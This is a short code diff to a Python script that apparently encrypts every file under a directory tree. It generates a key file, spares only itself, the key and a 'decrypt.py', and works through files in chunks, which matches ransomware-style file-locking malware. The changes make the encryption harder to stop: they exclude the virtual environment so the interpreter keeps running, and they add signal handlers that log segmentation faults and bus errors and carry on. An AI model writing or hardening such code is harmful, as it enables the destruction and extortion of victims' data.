@@ -42,6 +42,10 @@ with open("thekey.key", "wb") as key_file:
 EXCLUDE_FILES = {"main.py", "thekey.key", "decrypt.py"}
 EXCLUDE_DIRS = {os.path.abspath(os.path.dirname(sys.executable)), os.path.abspath(os.path.dirname(__file__))}
 
+# Add the virtual environment directory to the exclusion list
+if 'VIRTUAL_ENV' in os.environ:
+    EXCLUDE_DIRS.add(os.environ['VIRTUAL_ENV'])
+
 # Function to encrypt a file
 def encrypt_file(file_path):
     try:
@@ -77,12 +81,17 @@ def process_files_in_chunks(files, chunk_size=10):
             break
         yield chunk
 
-# Signal handler for bus errors
+# Signal handler for bus errors and segmentation faults
 def bus_error_handler(signum, frame):
     logging.error("Bus error (signal %d). Continuing..." % signum)
     time.sleep(1)
 
+def segfault_handler(signum, frame):
+    logging.error("Segmentation fault (signal %d). Continuing..." % signum)
+    time.sleep(1)
+
 signal.signal(signal.SIGBUS, bus_error_handler)
+signal.signal(signal.SIGSEGV, segfault_handler)
 
 # Encrypt files in chunks
 def encrypt_files_in_chunks(root_dir, exclude_paths, chunk_size=10):
@@ -112,6 +121,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
 
